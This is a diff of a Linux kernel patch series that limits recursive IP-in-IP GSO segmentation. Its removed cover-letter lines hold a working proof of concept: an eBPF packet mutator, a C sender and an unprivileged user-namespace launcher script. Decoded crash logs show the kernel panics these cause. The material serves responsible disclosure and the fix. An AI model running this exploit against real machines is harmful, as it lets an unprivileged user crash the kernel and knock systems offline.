-	if (skb->protocol != bpf_htons(ETH_P_IP))
-		return TC_ACT_OK;
-	if (skb->len < 2000)
-		return TC_ACT_OK;
-	if (load_bytes(skb, off, &outer, sizeof(outer)) < 0)
-		return TC_ACT_OK;
-	if (outer.version != 4 || outer.ihl != 5 || outer.protocol != IPPROTO_IPIP)
-		return TC_ACT_OK;
-	if (load_bytes(skb, ins_off, &inner, sizeof(inner)) < 0)
-		return TC_ACT_OK;
-	if (inner.version != 4 || inner.ihl != 5 || inner.protocol != IPPROTO_TCP)
-		return TC_ACT_OK;
-	if (load_bytes(skb, ins_off + sizeof(inner), &th, sizeof(th)) < 0)
-		return TC_ACT_OK;
-	if (th.dest != bpf_htons(TRIGGER_PORT))
-		return TC_ACT_OK;
-	if (bpf_skb_adjust_room(skb, INSERTED_LEN, BPF_ADJ_ROOM_NET,
-				BPF_F_ADJ_ROOM_FIXED_GSO |
-				BPF_F_ADJ_ROOM_NO_CSUM_RESET) < 0)
-		return TC_ACT_SHOT;
-
-	new_tot = bpf_htons(bpf_ntohs(outer.tot_len) + INSERTED_LEN);
-	bpf_l3_csum_replace(skb, off + offsetof(struct iphdr, check),
-			    outer.tot_len, new_tot, sizeof(new_tot));
-	bpf_skb_store_bytes(skb, off + offsetof(struct iphdr, tot_len),
-			    &new_tot, sizeof(new_tot), 0);
-
-	for (i = 0; i < INSERTED_IPS; i++) {
-		struct iphdr iph = {};
-
-		iph.version = 4;
-		iph.ihl = 5;
-		iph.ttl = 64;
-		iph.protocol = IPPROTO_IPIP;
-		iph.frag_off = bpf_htons(IP_DF);
-		iph.id = bpf_htons((__u16)(i + 1));
-		iph.saddr = bpf_htonl(0x0a010001u + (__u32)i);
-		iph.daddr = bpf_htonl(0x0a020001u + (__u32)i);
-
-		if (bpf_skb_store_bytes(skb,
-					ins_off + ((__u32)i * sizeof(struct iphdr)),
-					&iph, sizeof(iph), 0) < 0)
-			return TC_ACT_SHOT;
-	}
-
-	return TC_ACT_OK;
-}
-
-char _license[] SEC("license") = "GPL";
-------END tc_mutate.bpf.c--------
-
-------BEGIN poc_privilege_optimized.c------
-#define _GNU_SOURCE
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <linux/udp.h>
-#include <netinet/in.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-#ifndef UDP_SEGMENT
-#define UDP_SEGMENT 103
-#endif
-#ifndef SOL_UDP
-#define SOL_UDP 17
-#endif
-
-struct ipv4_min {
-	uint8_t version_ihl;
-	uint8_t tos;
-	uint16_t tot_len;
-	uint16_t id;
-	uint16_t frag_off;
-	uint8_t ttl;
-	uint8_t protocol;
-	uint16_t check;
-	uint32_t saddr;
-	uint32_t daddr;
-} __attribute__((packed));
-
-static void fill_ipip(struct ipv4_min *iph, unsigned int id, uint8_t protocol)
-{
-	memset(iph, 0, sizeof(*iph));
-	iph->version_ihl = 0x45;
-	iph->tot_len = htons(sizeof(*iph)); /* parser does not use this field */
-	iph->id = htons((uint16_t)id);
-	iph->ttl = 64;
-	iph->protocol = protocol;
-	iph->saddr = htonl(0x0a000001U);
-	iph->daddr = htonl(0x0a000002U);
-}
-
-int main(int argc, char **argv)
-{
-	struct sockaddr_in bind_addr = { .sin_family = AF_INET };
-	struct sockaddr_in dst = { .sin_family = AF_INET };
-	struct msghdr msg = {0};
-	struct iovec iov;
-	unsigned char control[CMSG_SPACE(sizeof(uint16_t))];
-	struct cmsghdr *cm;
-	unsigned char *payload;
-	unsigned int depth, segsz, payload_len, i;
-	ssize_t ret;
-	int fd;
-
-	if (argc != 5) {
-		fprintf(stderr, "usage: %s DEST PORT DEPTH GSO_SIZE\n", argv[0]);
-		return 2;
-	}
-	depth = strtoul(argv[3], NULL, 0);
-	segsz = strtoul(argv[4], NULL, 0);
-	if (depth < 1 || depth > 3000 || segsz < 1 || segsz > 65535) {
-		fprintf(stderr, "invalid depth or GSO size\n");
-		return 2;
-	}
-
-	/*
-	 * After tc changes the original inner IPv4 protocol UDP -> IPIP,
-	 * the 8-byte UDP header and payload[0..11] are parsed as an IPv4
-	 * header.  Source port 0x4500 supplies version=4, IHL=5.  payload[1]
-	 * supplies protocol=IPIP.  The explicit headers start at payload+12.
-	 */
-	payload_len = 12 + depth * sizeof(struct ipv4_min) + 64;
-	if (payload_len > 65507) {
-		fprintf(stderr, "payload too large: %u\n", payload_len);
-		return 2;
-	}
-	payload = calloc(1, payload_len);
-	if (!payload) {
-		perror("calloc");
-		return 1;
-	}
-	payload[0] = 64;
-	payload[1] = IPPROTO_IPIP;
-	for (i = 0; i < depth; i++)
-		fill_ipip((struct ipv4_min *)(payload + 12 + i * 20), i,
-			  i + 1 == depth ? IPPROTO_UDP : IPPROTO_IPIP);
-
-	fd = socket(AF_INET, SOCK_DGRAM, 0);
-	if (fd < 0) {
-		perror("socket");
-		return 1;
-	}
-	bind_addr.sin_port = htons(0x4500);
-	bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
-		perror("bind(0x4500)");
-		return 1;
-	}
-	if (inet_pton(AF_INET, argv[1], &dst.sin_addr) != 1) {
-		fprintf(stderr, "bad destination\n");
-		return 2;
-	}
-	dst.sin_port = htons((uint16_t)strtoul(argv[2], NULL, 0));
-
-	iov.iov_base = payload;
-	iov.iov_len = payload_len;
-	msg.msg_name = &dst;
-	msg.msg_namelen = sizeof(dst);
-	msg.msg_iov = &iov;
-	msg.msg_iovlen = 1;
-	msg.msg_control = control;
-	msg.msg_controllen = sizeof(control);
-	memset(control, 0, sizeof(control));
-	cm = CMSG_FIRSTHDR(&msg);
-	cm->cmsg_level = SOL_UDP;
-	cm->cmsg_type = UDP_SEGMENT;
-	cm->cmsg_len = CMSG_LEN(sizeof(uint16_t));
-	*(uint16_t *)CMSG_DATA(cm) = (uint16_t)segsz;
-
-	fprintf(stderr, "uid=%u euid=%u send UDP_SEGMENT payload=%u depth=%u gso_size=%u source_port=0x4500\n",
-		(unsigned)getuid(), (unsigned)geteuid(), payload_len, depth, segsz);
-	ret = sendmsg(fd, &msg, 0);
-	if (ret < 0) {
-		fprintf(stderr, "sendmsg: %s (%d)\n", strerror(errno), errno);
-		return 1;
-	}
-	fprintf(stderr, "sendmsg returned %zd\n", ret);
-	close(fd);
-	free(payload);
-	return ret == (ssize_t)payload_len ? 0 : 1;
-}
-------END poc_privilege_optimized.c--------
-
-------BEGIN poc_privilege_optimized.sh------
-#!/bin/sh
-set -eu
-
-PATH=/usr/sbin:/usr/bin:/sbin:/bin
-export PATH
-
-DEPTH=${1:-180}
-GSO_SIZE=${2:-4096}
-
-echo "launcher uid=$(id -u) gid=$(id -g)"
-echo "status before unshare: $(awk '/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}' /proc/self/status)"
-
-exec unshare --user --map-root-user --net sh -eu -c '
-	echo "inside uid=$(id -u) gid=$(id -g)"
-	echo "uid_map: $(tr "\n" ";" </proc/self/uid_map)"
-	echo "gid_map: $(tr "\n" ";" </proc/self/gid_map)"
-	echo "status: $(awk '\''/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}'\'' /proc/self/status)"
-
-	ip link add q7dummy type dummy
-	ip addr add 10.23.0.1/32 dev q7dummy
-	ip link set q7dummy up
-	ip route add 10.23.0.2/32 dev q7dummy
-
-	ip link add q7tun type ipip local 10.23.0.1 remote 10.23.0.2 dev q7dummy
-	ip addr add 198.18.7.1 peer 198.18.7.2 dev q7tun
-	ip link set q7tun up
-
-	# Make segmentation happen in software after the egress action.  Offset 29
-	# is the protocol byte of the original inner IPv4 header (20 + 9).
-	ethtool -K q7dummy tso off gso off gro off sg off \
-		tx-ipxip4-segmentation off tx-udp-segmentation off
-	tc qdisc add dev q7dummy clsact
-	tc filter add dev q7dummy egress protocol ip pref 1 matchall \
-		action pedit munge offset 29 u8 set 4
-
-	./poc_privilege_optimized 198.18.7.2 9000 "$1" "$2"
-' sh "$DEPTH" "$GSO_SIZE"
-------END poc_privilege_optimized.sh--------
-
-
-The crash log excerpts below are copied from the unpatched namespace-only
-and BPF/veth runs on 88c17de85ddb. Both were decoded with
-scripts/decode_stacktrace.sh using the matching unpatched vmlinux;
-each label identifies the corresponding run.
-
-----BEGIN crash log----
-[namespace-only, UID 65534, unpatched 88c17de85ddb]
-[   11.336820] BUG: TASK stack guard page was hit at ffff9ab440aebff8 (stack is ffff9ab440aec000..ffff9ab440af0000)
-[   11.336823] Oops: stack guard page: 0000 [#1] SMP NOPTI
-[   11.336825] CPU: 0 UID: 65534 PID: 403 Comm: poc_privilege_o Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
-[   11.336826] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   11.336827] RIP: 0010:skb_copy_bits (net/core/skbuff.c:3061)
-[   11.336869] Call Trace:
-[   11.336882]  <TASK>
-[   11.336884]  __pskb_pull_tail (net/core/skbuff.c:2892 (discriminator 2))
-[   11.336885]  ? skb_copy_bits (net/core/skbuff.c:3061)
-[   11.336886]  inet_gso_segment (include/linux/skbuff.h:2873 (discriminator 1) include/linux/skbuff.h:2882 (discriminator 1) net/ipv4/af_inet.c:1379 (discriminator 1))
-[   11.336889]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336891]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336892]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336893]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336894]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336896]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336897]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336898]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336899]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336901]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336902]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.336903]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   11.337200] Kernel panic - not syncing: Fatal exception in interrupt
-
-[BPF/veth, unpatched 88c17de85ddb]
-[   18.344957] BUG: TASK stack guard page was hit at ffff9d2180bb3fe8 (stack is ffff9d2180bb4000..ffff9d2180bb8000)
-[   18.344962] Oops: stack guard page: 0000 [#1] SMP NOPTI
-[   18.344964] CPU: 1 UID: 0 PID: 433 Comm: poc Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
-[   18.344966] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   18.344967] RIP: 0010:inet_gso_segment (net/ipv4/af_inet.c:1404 (discriminator 1))
-[   18.345011] CR2: ffff9d2180bb3fe8 CR3: 000000000dcd8003 CR4: 0000000000370ef0
-[   18.345012] Call Trace:
-[   18.345035]  <TASK>
-[   18.345036]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345039]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345040]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345042]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345043]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345045]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345047]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345048]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345050]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345051]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345053]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345054]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345056]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345057]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345059]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345060]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345281]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345282]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345284]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345285]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345287]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345288]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345290]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345291]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345293]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345295]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345296]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345298]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345299]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345301]  inet_gso_segment (net/ipv4/af_inet.c:1411)
-[   18.345302]  skb_mac_gso_segment (net/core/gso.c:53)
-[   18.345305]  __skb_gso_segment (net/core/gso.c:124)
-[   18.345306]  validate_xmit_skb.isra.0 (include/net/gso.h:83 net/core/dev.c:4044)
-[   18.345309]  __dev_queue_xmit (net/core/dev.c:4865)
-[   18.345312]  ip_finish_output2 (include/linux/netdevice.h:3446 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
-[   18.345315]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
-[   18.345317]  ? __pfx_ip_finish_output (include/net/dst.h:470 (discriminator 7))
-[   18.345318]  iptunnel_xmit (net/ipv4/ip_tunnel_core.c:97)
-[   18.345321]  ip_tunnel_xmit (net/ipv4/ip_tunnel.c:848)
-[   18.345323]  ipip_tunnel_xmit (net/ipv4/ipip.c:316)
-[   18.345325]  dev_hard_start_xmit (include/linux/netdevice.h:5400 include/linux/netdevice.h:5409 net/core/dev.c:3889 net/core/dev.c:3905)
-[   18.345326]  ? validate_xmit_skb.isra.0 (net/core/dev.c:4067)
-[   18.345328]  __dev_queue_xmit (net/core/dev.c:4878)
-[   18.345375] Kernel panic - not syncing: Fatal exception in interrupt
-[   18.346542] Kernel Offset: 0x38800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
-[   19.982144] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
------END crash log-----
-
-Best regards,
-Zihan Xi
-
-Zihan Xi (1):
-  net: gso: limit recursive IP-in-IP segmentation
 
  include/net/gso.h       | 29 +++++++++++++++++++++++++++++
  net/core/gso.c          |  7 +++++--
@@ -830,5 +148,289 @@ Zihan Xi (1):
  net/nsh/nsh.c           |  2 ++
  10 files changed, 73 insertions(+), 9 deletions(-)
 
+diff --git a/include/net/gso.h b/include/net/gso.h
+index 29975440c..c3d38f838 100644
+--- a/include/net/gso.h
++++ b/include/net/gso.h
+@@ -19,10 +19,39 @@ struct skb_gso_cb {
+ 	int	encap_level;
+ 	__wsum	csum;
+ 	__u16	csum_start;
++	/* Bytes charged to the current GSO callback chain. */
++	u16	gso_header_len;
+ };
+ #define SKB_GSO_CB_OFFSET	32
+ #define SKB_GSO_CB(skb) ((struct skb_gso_cb *)((skb)->cb + SKB_GSO_CB_OFFSET))
+ 
++#define GSO_MAX_HEADER	256
++
++static inline bool gso_header_len_add(struct sk_buff *skb,
++				      unsigned int len)
++{
++	struct skb_gso_cb *cb = SKB_GSO_CB(skb);
++
++	if (unlikely(cb->gso_header_len > GSO_MAX_HEADER ||
++		     len > GSO_MAX_HEADER - cb->gso_header_len))
++		return true;
++
++	cb->gso_header_len += len;
++	return false;
++}
++
++static inline struct sk_buff *
++skb_gso_segment_cb(struct sk_buff *skb,
++		   struct sk_buff *(*gso_segment)(struct sk_buff *,
++						  netdev_features_t),
++			netdev_features_t features)
++{
++	if (unlikely(gso_header_len_add(skb, 0)))
++		return ERR_PTR(-EINVAL);
++
++	return gso_segment(skb, features);
++}
++
+ static inline int skb_tnl_header_len(const struct sk_buff *inner_skb)
+ {
+ 	return (skb_mac_header(inner_skb) - inner_skb->head) -
+diff --git a/net/core/gso.c b/net/core/gso.c
+index bcd156372..68e4acc11 100644
+--- a/net/core/gso.c
++++ b/net/core/gso.c
+@@ -19,7 +19,8 @@ struct sk_buff *skb_eth_gso_segment(struct sk_buff *skb,
+ 	rcu_read_lock();
+ 	list_for_each_entry_rcu(ptype, &net_hotdata.offload_base, list) {
+ 		if (ptype->type == type && ptype->callbacks.gso_segment) {
+-			segs = ptype->callbacks.gso_segment(skb, features);
++			segs = skb_gso_segment_cb(skb, ptype->callbacks.gso_segment,
++						  features);
+ 			break;
+ 		}
+ 	}
+@@ -50,7 +51,8 @@ struct sk_buff *skb_mac_gso_segment(struct sk_buff *skb,
+ 	rcu_read_lock();
+ 	list_for_each_entry_rcu(ptype, &net_hotdata.offload_base, list) {
+ 		if (ptype->type == type && ptype->callbacks.gso_segment) {
+-			segs = ptype->callbacks.gso_segment(skb, features);
++			segs = skb_gso_segment_cb(skb, ptype->callbacks.gso_segment,
++						  features);
+ 			break;
+ 		}
+ 	}
+@@ -117,6 +119,7 @@ struct sk_buff *__skb_gso_segment(struct sk_buff *skb,
+ 
+ 	SKB_GSO_CB(skb)->mac_offset = skb_headroom(skb);
+ 	SKB_GSO_CB(skb)->encap_level = 0;
++	SKB_GSO_CB(skb)->gso_header_len = 0;
+ 
+ 	skb_reset_mac_header(skb);
+ 	skb_reset_mac_len(skb);
+diff --git a/net/ipv4/af_inet.c b/net/ipv4/af_inet.c
+index 32d006c1a..415274d49 100644
+--- a/net/ipv4/af_inet.c
++++ b/net/ipv4/af_inet.c
+@@ -1375,6 +1375,8 @@ struct sk_buff *inet_gso_segment(struct sk_buff *skb,
+ 	int id;
+ 
+ 	skb_reset_network_header(skb);
++	if (unlikely(gso_header_len_add(skb, 0)))
++		goto out;
+ 	nhoff = skb_network_header(skb) - skb_mac_header(skb);
+ 	if (unlikely(!pskb_may_pull(skb, sizeof(*iph))))
+ 		goto out;
+@@ -1390,6 +1392,8 @@ struct sk_buff *inet_gso_segment(struct sk_buff *skb,
+ 	/* Warning: after this point, iph might be no longer valid */
+ 	if (unlikely(!pskb_may_pull(skb, ihl)))
+ 		goto out;
++	if (unlikely(gso_header_len_add(skb, ihl)))
++		goto out;
+ 	__skb_pull(skb, ihl);
+ 
+ 	encap = SKB_GSO_CB(skb)->encap_level > 0;
+@@ -1408,7 +1412,8 @@ struct sk_buff *inet_gso_segment(struct sk_buff *skb,
+ 
+ 	ops = rcu_dereference(inet_offloads[proto]);
+ 	if (likely(ops && ops->callbacks.gso_segment)) {
+-		segs = ops->callbacks.gso_segment(skb, features);
++		segs = skb_gso_segment_cb(skb, ops->callbacks.gso_segment,
++					  features);
+ 		if (!segs)
+ 			skb->network_header = skb_mac_header(skb) + nhoff - skb->head;
+ 	}
+diff --git a/net/ipv4/esp4_offload.c b/net/ipv4/esp4_offload.c
+index abd77162f..cb2c4bbe6 100644
+--- a/net/ipv4/esp4_offload.c
++++ b/net/ipv4/esp4_offload.c
+@@ -141,7 +141,8 @@ static struct sk_buff *xfrm4_transport_gso_segment(struct xfrm_state *x,
+ 	skb->transport_header += x->props.header_len;
+ 	ops = rcu_dereference(inet_offloads[xo->proto]);
+ 	if (likely(ops && ops->callbacks.gso_segment))
+-		segs = ops->callbacks.gso_segment(skb, features);
++		segs = skb_gso_segment_cb(skb, ops->callbacks.gso_segment,
++					  features);
+ 
+ 	return segs;
+ }
+@@ -182,7 +183,8 @@ static struct sk_buff *xfrm4_beet_gso_segment(struct xfrm_state *x,
+ 	__skb_pull(skb, skb_transport_offset(skb));
+ 	ops = rcu_dereference(inet_offloads[proto]);
+ 	if (likely(ops && ops->callbacks.gso_segment))
+-		segs = ops->callbacks.gso_segment(skb, features);
++		segs = skb_gso_segment_cb(skb, ops->callbacks.gso_segment,
++					  features);
+ 
+ 	return segs;
+ }
+@@ -229,6 +231,9 @@ static struct sk_buff *esp4_gso_segment(struct sk_buff *skb,
+ 
+ 	if (!pskb_may_pull(skb, sizeof(*esph) + crypto_aead_ivsize(aead)))
+ 		return ERR_PTR(-EINVAL);
++	if (unlikely(gso_header_len_add(skb,
++					sizeof(*esph) + crypto_aead_ivsize(aead))))
++		return ERR_PTR(-EINVAL);
+ 
+ 	__skb_pull(skb, sizeof(*esph) + crypto_aead_ivsize(aead));
+ 
+diff --git a/net/ipv4/gre_offload.c b/net/ipv4/gre_offload.c
+index 5028c72d4..a973b552b 100644
+--- a/net/ipv4/gre_offload.c
++++ b/net/ipv4/gre_offload.c
+@@ -32,6 +32,8 @@ static struct sk_buff *gre_gso_segment(struct sk_buff *skb,
+ 
+ 	if (unlikely(!pskb_may_pull(skb, tnl_hlen)))
+ 		goto out;
++	if (unlikely(gso_header_len_add(skb, tnl_hlen)))
++		goto out;
+ 
+ 	/* setup inner skb. */
+ 	skb->encapsulation = 0;
+diff --git a/net/ipv4/udp_offload.c b/net/ipv4/udp_offload.c
+index cf07c3c66..bcba85c6c 100644
+--- a/net/ipv4/udp_offload.c
++++ b/net/ipv4/udp_offload.c
+@@ -188,6 +188,8 @@ static struct sk_buff *__skb_udp_tunnel_segment(struct sk_buff *skb,
+ 
+ 	if (unlikely(!pskb_may_pull(skb, tnl_hlen)))
+ 		goto out;
++	if (unlikely(gso_header_len_add(skb, tnl_hlen)))
++		goto out;
+ 
+ 	uh = udp_hdr(skb);
+ 
+@@ -242,7 +244,7 @@ static struct sk_buff *__skb_udp_tunnel_segment(struct sk_buff *skb,
+ 	}
+ 
+ 	/* segment inner packet. */
+-	segs = gso_inner_segment(skb, features);
++	segs = skb_gso_segment_cb(skb, gso_inner_segment, features);
+ 	if (IS_ERR_OR_NULL(segs)) {
+ 		skb_gso_error_unwind(skb, protocol, tnl_hlen, mac_offset,
+ 				     mac_len);
+diff --git a/net/ipv6/esp6_offload.c b/net/ipv6/esp6_offload.c
+index 22895521a..9f4fc9dae 100644
+--- a/net/ipv6/esp6_offload.c
++++ b/net/ipv6/esp6_offload.c
+@@ -177,7 +177,8 @@ static struct sk_buff *xfrm6_transport_gso_segment(struct xfrm_state *x,
+ 	skb->transport_header += x->props.header_len;
+ 	ops = rcu_dereference(inet6_offloads[xo->proto]);
+ 	if (likely(ops && ops->callbacks.gso_segment))
+-		segs = ops->callbacks.gso_segment(skb, features);
++		segs = skb_gso_segment_cb(skb, ops->callbacks.gso_segment,
++					  features);
+ 
+ 	return segs;
+ }
+@@ -222,7 +223,8 @@ static struct sk_buff *xfrm6_beet_gso_segment(struct xfrm_state *x,
+ 	__skb_pull(skb, skb_transport_offset(skb));
+ 	ops = rcu_dereference(inet6_offloads[proto]);
+ 	if (likely(ops && ops->callbacks.gso_segment))
+-		segs = ops->callbacks.gso_segment(skb, features);
++		segs = skb_gso_segment_cb(skb, ops->callbacks.gso_segment,
++					  features);
+ 
+ 	return segs;
+ }
+@@ -269,6 +271,9 @@ static struct sk_buff *esp6_gso_segment(struct sk_buff *skb,
+ 
+ 	if (!pskb_may_pull(skb, sizeof(*esph) + crypto_aead_ivsize(aead)))
+ 		return ERR_PTR(-EINVAL);
++	if (unlikely(gso_header_len_add(skb,
++					sizeof(*esph) + crypto_aead_ivsize(aead))))
++		return ERR_PTR(-EINVAL);
+ 
+ 	__skb_pull(skb, sizeof(*esph) + crypto_aead_ivsize(aead));
+ 
+diff --git a/net/ipv6/ip6_offload.c b/net/ipv6/ip6_offload.c
+index 78f50c93c..2182e77ae 100644
+--- a/net/ipv6/ip6_offload.c
++++ b/net/ipv6/ip6_offload.c
+@@ -79,6 +79,8 @@ static int ipv6_gso_pull_exthdrs(struct sk_buff *skb, int proto)
+ 
+ 		if (unlikely(!pskb_may_pull(skb, len)))
+ 			break;
++		if (unlikely(gso_header_len_add(skb, len)))
++			return -EINVAL;
+ 
+ 		opth = (void *)skb->data;
+ 		proto = opth->nexthdr;
+@@ -104,9 +106,13 @@ static struct sk_buff *ipv6_gso_segment(struct sk_buff *skb,
+ 	bool gso_partial;
+ 
+ 	skb_reset_network_header(skb);
++	if (unlikely(gso_header_len_add(skb, 0)))
++		goto out;
+ 	nhoff = skb_network_header(skb) - skb_mac_header(skb);
+ 	if (unlikely(!pskb_may_pull(skb, sizeof(*ipv6h))))
+ 		goto out;
++	if (unlikely(gso_header_len_add(skb, sizeof(*ipv6h))))
++		goto out;
+ 
+ 	encap = SKB_GSO_CB(skb)->encap_level > 0;
+ 	if (encap)
+@@ -118,6 +124,8 @@ static struct sk_buff *ipv6_gso_segment(struct sk_buff *skb,
+ 	segs = ERR_PTR(-EPROTONOSUPPORT);
+ 
+ 	proto = ipv6_gso_pull_exthdrs(skb, ipv6h->nexthdr);
++	if (unlikely(proto < 0))
++		goto out;
+ 
+ 	if (skb->encapsulation &&
+ 	    skb_shinfo(skb)->gso_type & (SKB_GSO_IPXIP4 | SKB_GSO_IPXIP6))
+@@ -132,7 +140,8 @@ static struct sk_buff *ipv6_gso_segment(struct sk_buff *skb,
+ 		if (!skb_reset_transport_header_careful(skb))
+ 			goto out;
+ 
+-		segs = ops->callbacks.gso_segment(skb, features);
++		segs = skb_gso_segment_cb(skb, ops->callbacks.gso_segment,
++					  features);
+ 		if (!segs)
+ 			skb->network_header = skb_mac_header(skb) + nhoff - skb->head;
+ 	}
+diff --git a/net/mpls/mpls_gso.c b/net/mpls/mpls_gso.c
+index 34ab659f5..a535f4988 100644
+--- a/net/mpls/mpls_gso.c
++++ b/net/mpls/mpls_gso.c
+@@ -36,6 +36,8 @@ static struct sk_buff *mpls_gso_segment(struct sk_buff *skb,
+ 		goto out;
+ 	if (unlikely(!pskb_may_pull(skb, mpls_hlen)))
+ 		goto out;
++	if (unlikely(gso_header_len_add(skb, mpls_hlen)))
++		goto out;
+ 
+ 	/* Setup inner SKB. */
+ 	mpls_protocol = skb->protocol;
+diff --git a/net/nsh/nsh.c b/net/nsh/nsh.c
+index bfb775806..49d16283b 100644
+--- a/net/nsh/nsh.c
++++ b/net/nsh/nsh.c
+@@ -95,6 +95,8 @@ static struct sk_buff *nsh_gso_segment(struct sk_buff *skb,
+ 		goto out;
+ 	if (unlikely(!pskb_may_pull(skb, nsh_len)))
+ 		goto out;
++	if (unlikely(gso_header_len_add(skb, nsh_len)))
++		goto out;
+ 
+ 	proto = tun_p_to_eth_p(nsh_hdr(skb)->np);
+ 	if (!proto)
 -- 
 2.43.0
+
